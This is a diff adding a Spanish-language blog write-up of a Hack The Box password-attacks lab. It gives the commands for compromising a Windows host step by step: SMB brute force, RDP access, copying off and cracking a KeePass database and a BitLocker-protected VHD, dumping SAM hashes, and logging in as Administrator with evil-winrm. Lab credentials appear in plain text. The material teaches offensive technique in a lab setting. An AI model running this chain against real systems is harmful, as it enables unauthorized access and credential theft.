@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><title>
+    
+    Laboratorio De Ataques De Contraseña - Díficil | 
+    
+    CHL Blog
+</title>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<link rel="canonical" href="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-ataques-de-contrase%C3%B1a---d%C3%ADficil/" />
+<link rel="icon" type="image/png" href="https://chlorenzo.com/image/favicon.ico">
+
+
+<meta name="description" content="
+    Este laboratorio se centra en el compromiso de una máquina Windows a través del abuso de credenciales, fuerza bruta sobre SMB y RDP, extracción y crackeo de un archivo KeePass, y montaje de una imagen VHD protegida por BitLocker. Se aplican técnicas de post-explotación para obtener hashes de cuentas y acceso como Administrator mediante Evil-WinRM.
+    "
+/>
+<meta property="og:description" content="
+    Este laboratorio se centra en el compromiso de una máquina Windows a través del abuso de credenciales, fuerza bruta sobre SMB y RDP, extracción y crackeo de un archivo KeePass, y montaje de una imagen VHD protegida por BitLocker. Se aplican técnicas de post-explotación para obtener hashes de cuentas y acceso como Administrator mediante Evil-WinRM.
+    " 
+/>
+
+
+
+
+<meta property="og:title" content="Laboratorio de Ataques de Contraseña - Díficil" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-ataques-de-contrase%C3%B1a---d%C3%ADficil/" /><meta property="article:section" content="pagina_web" />
+<meta property="article:published_time" content="2025-06-02T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-06-02T00:00:00+00:00" />
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Laboratorio de Ataques de Contraseña - Díficil">
+  <meta name="twitter:description" content="Este laboratorio se centra en el compromiso de una máquina Windows a través del abuso de credenciales, fuerza bruta sobre SMB y RDP, extracción y crackeo de un archivo KeePass, y montaje de una imagen VHD protegida por BitLocker. Se aplican técnicas de post-explotación para obtener hashes de cuentas y acceso como Administrator mediante Evil-WinRM.">
+
+
+  <meta itemprop="name" content="Laboratorio de Ataques de Contraseña - Díficil">
+  <meta itemprop="description" content="Este laboratorio se centra en el compromiso de una máquina Windows a través del abuso de credenciales, fuerza bruta sobre SMB y RDP, extracción y crackeo de un archivo KeePass, y montaje de una imagen VHD protegida por BitLocker. Se aplican técnicas de post-explotación para obtener hashes de cuentas y acceso como Administrator mediante Evil-WinRM.">
+  <meta itemprop="datePublished" content="2025-06-02T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-06-02T00:00:00+00:00">
+  <meta itemprop="wordCount" content="657">
+  <meta itemprop="keywords" content="Hackthebox,SMB,RDP,Keepass,WebShell,Bitlocker,Vhd,Dislocker,Evilwinrm">
+
+
+
+
+<link rel="stylesheet" href="https://chlorenzo.com/main.min.css">
+
+
+
+
+
+<script src="https://chlorenzo.com/bundle.js"></script>
+
+
+
+
+
+
+
+<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4G9W14SLG4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4G9W14SLG4');
+</script>
+
+
+
+
+
+
+</head>
+
+<body><header id="header">
+  <div class="top-bar">
+    <div class="container-md">
+
+      <div class="row align-items-center">
+        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
+          <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+        </div>
+
+        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
+          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+            <i class="fas fa-bars"></i>
+          </button>
+        </div>
+
+        <div class="col-6 col-sm-4">
+          <h2 class="title"><a href="https://chlorenzo.com/">CHL Blog</a></h2>
+        </div>
+
+        
+        <div class="col-3 col-sm-4">
+          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
+            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
+              role="search">
+              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
+              <button class="btn" type="submit">
+                <i class="fa fa-search"></i>
+              </button>
+            </form>
+          </div>
+        </div>
+        
+
+      </div>
+    </div>
+  </div>
+
+  <div class="container-md">
+    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav mx-auto">
+
+          <li class="nav-item d-block d-sm-none">
+            <ul class="social-buttons">
+              <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+            </ul>
+          </li>
+
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/">
+              Home
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
+              Blog
+            </a>
+            <div class="dropdown-menu">
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+              
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
+              
+              
+              
+                <div class="dropdown-divider"></div>
+              
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/tags/">Búsqueda por etiquetas</a>
+              
+              
+            </div>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/pagina_web/trayectoria/">
+              Trayectoria
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/pagina_web/contact/">
+              Contacto
+            </a>
+          </li>
+          
+          
+        </ul>
+
+        
+        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
+          onsubmit="return executeQuery('xs');" role="search">
+          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
+          <button class="btn" type="submit">
+            <i class="fa fa-search"></i>
+          </button>
+        </form>
+        
+
+      </div>
+    </nav>
+  </div>
+</header>
+
+<main class="blog-content">
+    <div class="container-md">
+        <div class="row">
+            
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-left-offset"></div>
+                
+            </div>
+
+            <div class="col-md-12 col-lg-8 px-lg-4">
+                
+
+                <h1 class="title">Laboratorio de Ataques de Contraseña - Díficil</h1>
+
+                <div class="container-fluid px-0 mb-4">
+                    <div class="row align-items-end">
+                        <div class="col-md-4 date-time">
+                            <span class="date">
+    Jun 2, 2025
+</span>
+                            &centerdot;
+                            <span class="time-to-read">
+    4 mins read</span>
+                        </div>
+
+                        <div class="col-md-8 tags ">
+                            
+                            <a href="https://chlorenzo.com/tags/hackthebox"><span
+                                    class="tag bg-dark">hackthebox</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/smb"><span
+                                    class="tag bg-dark">smb</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/rdp"><span
+                                    class="tag bg-dark">rdp</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/keepass"><span
+                                    class="tag bg-dark">keepass</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/webshell"><span
+                                    class="tag bg-dark">webshell</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/bitlocker"><span
+                                    class="tag bg-dark">bitlocker</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/vhd"><span
+                                    class="tag bg-dark">vhd</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/dislocker"><span
+                                    class="tag bg-dark">dislocker</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/evilwinrm"><span
+                                    class="tag bg-dark">evilwinrm</span></a>
+                            
+                        </div>
+                    </div>
+                </div>
+
+                
+
+                <h4 id="enunciado">Enunciado</h4>
+<p>El siguiente host es un cliente basado en Windows. Al igual que en las evaluaciones anteriores, nuestro cliente desea asegurarse de que un atacante no pueda acceder a ningún archivo confidencial en caso de un ataque exitoso. Mientras nuestros compañeros estaban ocupados con otros hosts de la red, descubrimos que el usuario <code>Johanna</code> está presente en muchos hosts. Sin embargo, aún no hemos podido determinar el motivo exacto de esto.</p>
+<p>De entrada nos están dando un posible usuario, más adelante vemos donde lo podemos usar.</p>
+<h4 id="enumeración-de-puertos"><strong>Enumeración de puertos</strong></h4>
+<p>Vamos con lo básico a ver qué servicios están corriendo sobre el servidor.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- -sS --min-rate <span style="color:#ae81ff">2000</span> -n -Pn &lt;IP&gt;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/nmap1.png" alt="">
+Vemos que tenemos los puertos 111, 135, 139, 445, 2049, 3389, 5985, etc, abiertos, vamos a recoger más información de los servicios que hay corriendo en cada puerto que nos salió a ver si vemos algo interesante.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,111,135,139,445,2049,3389,5985,47001,49664,49668 -sCV -n -Pn &lt;IP&gt;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/nmap2.png" alt="">
+<img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/nmap3.png" alt=""></p>
+<p>Donde vemos que el Nombre de la Máquina es WINSRV, nos da una versión de Windows de 10.0.17763.
+Empezamos a enumerar servicios y nos encontramos que en en el puerto 445 con el usuario que nos dieron al principio <code>johanna</code> y la lista de password mutada con las custom rules.
+Hacemos un ataque de fuerza bruta sobre ese servicio de la siguiente forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb &lt;IP&gt; -u johanna -p /.../mut_password.list
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/crackmapexec1.png" alt=""></p>
+<p>Listamos la información del servidor con las credenciales:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L //10.129.67.26/ -U Johanna
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#password</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/smbclient1.png" alt=""></p>
+<p>Vemos que hay un recurso <code>david</code> el cual intentamos listar pero con el usuario <code>johanna</code> no tenemos los permisos para ver nada.</p>
+<p>Con las credenciales del usuario <code>johanna</code> podemos acceder por <code>rdp</code> a su escritorio</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>xfreerdp3  /v:&lt;IP&gt; /u:johanna /p:<span style="color:#e6db74">&#39;1231234!&#39;</span> 
+</span></span></code></pre></div><p>Y vemos que en el directorio Documents hay un archivo del keepass, nos lo copiamos para local para trabajarlo más cómodo.
+<img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp.png" alt=""></p>
+<p>Nos vamos a instalar una herramienta para montar un servidor web sencillo y subir el archivo desde windows a nuestra máquina Linux.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m pip install uploadserver
+</span></span><span style="display:flex;"><span>python3 -m uploadserver
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp1.png" alt="">
+Nos lo instalamos así y procedemos a usarlo:
+<img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp2.png" alt="">
+En la máquina windows ponemos en el navegador <code>http://&lt;IP&gt;:8000</code> accedemos a la primera opción (File Upload) y subimos el archivo.</p>
+<p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp3.png" alt="">
+<img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp4.png" alt=""></p>
+<p>Luego vamos al directorio donde nos descarga el archivo y le ejecutamos el siguiente comando para intentar crackear la contraseña.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>keepass2john Logins.kdbx &gt; keepas.hash
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/.../mut_password.list keepas.hash
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/john1.png" alt=""></p>
+<p>Procedemos a entrar al archivo Logins.kdbx</p>
+<p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp5.png" alt=""></p>
+<p>Tenemos <code>david:gRzX7YbeTcDG7</code></p>
+<p>Recordemos que en el puerto 445 esta corriendo un smb donde hay un recurso llamado david al que ahora podemos intentar acceder</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //&lt;IP&gt;/david -U david --option<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;client min protocol=SMB2&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Password</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/smbclient2.png" alt=""></p>
+<p>Y vemos que tenemos un archivo backup.vhd
+Nos lo bajamos para trabajarlo en local(se demora un poco en bajarse porque pesa como 130 mb)</p>
+<p>Ahora con la herramienta bitlocker2john vamos a extraer los hashes para intentar crackearlos con las wordlists posteriormente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bitlocker2john -i Backup.vhd &gt; backup.hashes
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker1.png" alt=""></p>
+<p>Dentro de los hashes seleccionamos el de <code>bitlocker</code>:</p>
+<p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker2.png" alt=""></p>
+<p>Procedemos a crackear el hash con la <code>mut_password</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">22100</span> backup.hash /.../mut_password.list -o backup.cracked
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker3.png" alt=""></p>
+<p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker4.png" alt=""></p>
+<p>Vamos a montar el Backup.vhd como un dispositovo de almacenamiento para intentar acceder a los datos que en el se almacenan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo losetup --partscan --find --show Backup.vhd
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/backup1.png" alt="">
+Luego vemos que en slot 5 esta la partición de datos donde debe estar la información.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mmls Backup.vhd
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/backup2.png" alt="">
+Desbloqueamos el disco utilizando la contraseña que crakeamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo dislocker -V /dev/loop9p2 -u123456789! -- /mnt/bitlocker
+</span></span></code></pre></div><p>Montamos el volumen que <code>dislocker</code> crea:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir /mnt/bitlocker
+</span></span><span style="display:flex;"><span>mkdir /mnt/bitlocker_mount
+</span></span><span style="display:flex;"><span>sudo mount -o loop /mnt/bitlocker/dislocker-file /mnt/bitlocker_mount
+</span></span></code></pre></div><p>Y vemos su contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls /mnt/bitlocker_mount
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/backup3.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker5.png" alt=""></p>
+<p>Copiamos la linea de administrator para una archivo yo le puse adm.hash y le pasamos el john para crackerar el hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/.../mut_passwd.list adm.hash --format<span style="color:#f92672">=</span>NT
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/administrator_passwd.png" alt=""></p>
+<p>Ya con las credenciales de Administrator podemos usar evilwinrm y acceder a la flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i &lt;IP&gt; -u Administrator
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Password</span>
+</span></span></code></pre></div><p>Y nos movemos al directorio indicado.
+<img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/administrator_passwd2.png" alt=""></p>
+<p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>
+
+
+                <div id="social-media-share">
+	<p><i>Escríbeme por cualquiera de las vías</i></p>
+	
+	<div class="share-buttons">
+	    
+		<a href="https://www.instagram.com/19chl96/" 
+   			target="_blank" 
+   			title="Sígueme en Instagram">
+    		<img src=https://chlorenzo.com/icons/45px/instagram.png alt="Instagram">
+		</a>
+
+		<a  href="https://www.linkedin.com/in/chlinked/"
+	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
+	        title="Share on LinkedIn. Opens in a new window." >
+	        <img src=https://chlorenzo.com/icons/48px/linkedin.png>
+	    </a>
+
+	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
+   		   target="_blank" 
+   		   title="Enviar correo usando Gmail">
+    	<img src=https://chlorenzo.com/icons/48px/email.png alt="Email">
+		</a>
+
+		
+
+	</div>
+</div>
+
+
+
+                
+                <br>
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = '';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            </div>
+
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-right-offset"></div>
+                
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer class="bg-dark text-light py-4">
+    <div class="container-md">
+        <div class="row justify-content-center">
+            <div class="col-12">
+                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
+                    <ul class="navbar-nav">
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </div>
+    <div class="text-center mt-3">
+        <p>© 2025 Carlos Hernández Lorenzo</p>
+    </div>
+</footer>
+
+
+<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
+<gcse:searchresults-only></gcse:searchresults-only>
+
+</body>
+
+</html>
